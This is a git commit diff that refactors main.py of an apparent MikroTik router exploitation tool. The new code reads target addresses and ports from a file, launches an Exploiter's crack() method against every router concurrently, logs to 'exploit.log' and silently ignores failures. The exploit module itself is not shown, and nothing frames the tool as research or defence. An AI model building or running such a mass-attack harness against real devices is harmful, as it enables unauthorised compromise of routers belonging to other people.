774c07f744c001a69e332bcdf4b1aa9d9c10c307
Herman Guilliman <hermanguilliman@proton.me>
2023-11-30 18:04:50 +0300

    refactoring

--- main.py
+++ main.py
@@ -1,10 +1,23 @@
 from app.config import logger_setup
 from app.exploit_tool import Exploiter
 from app.source_loader import load_mikrotik_list_from_file
+import asyncio
+
+async def main():
+    tasks = []
+    mikrotik_list = load_mikrotik_list_from_file("mikrotiks.txt")
+    for mikrotik in mikrotik_list:
+        exploiter = Exploiter(address=mikrotik.address, port=mikrotik.port)
+        tasks.append(asyncio.create_task(exploiter.crack()))
+
+    for task in tasks:
+        try:
+            await task
+        except Exception:
+            pass
 
 if __name__ == "__main__":
     logger_setup("exploit.log")
-    mikrotik_list = load_mikrotik_list_from_file("mikrotiks.txt")
-    for mikrotik in mikrotik_list:
-        exploiter = Exploiter(mikrotik.address, mikrotik.port)
-        exploiter.crack()
+    asyncio.run(main())
+
+    
